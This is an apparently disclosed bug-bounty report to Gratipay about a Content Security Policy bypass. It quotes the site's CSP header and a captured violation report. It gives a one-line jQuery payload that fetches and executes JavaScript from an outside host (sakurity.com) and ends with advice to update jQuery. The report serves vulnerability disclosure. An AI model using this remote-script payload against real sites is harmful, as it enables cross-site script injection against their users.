# CSP Policy Bypass and javascript execution

## Report Details
- **Report ID**: 241192
- **URL**: https://hackerone.com/reports/241192
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-06-18T16:12:36.462Z
- **Disclosed**: 2017-06-18T17:40:27.286Z

## Reporter
- **Username**: athuljayaram
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gratipay

## Vulnerability Information
Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.

Content-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;


in that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to 
https://gratipay.report-uri.io/r/default/csp/reportOnly;


I have a captured CSP post request in case of violation

PUT /r/default/csp/reportOnly HTTP/1.1
Host: gratipay.report-uri.io
Connection: close
Content-Length: 738
Origin: https://gratipay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36
Content-Type: application/csp-report
Accept: */*
DNT: 1
Referer: https://gratipay.com/about/pricing
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6

{"csp-report":{"document-uri":"https://gratipay.com/about/pricing","referrer":"https://gratipay.com/about/","violated-directive":"connect-src","effective-directive":"connect-src","original-policy":"default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;","disposition":"report","blocked-uri":"https://sakurity.com/","line-number":8,"column-number":26577,"source-file":"https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~","status-code":0,"script-sample":""}}




I like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass

by using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,


So using $.get request 
it didn't send a CSP report 
it read the remote content and executed the javascript





SOLUTION
Update your javascript libraries mainly jquery  elements to the latest version



## Attachments
- gratipay_com.png
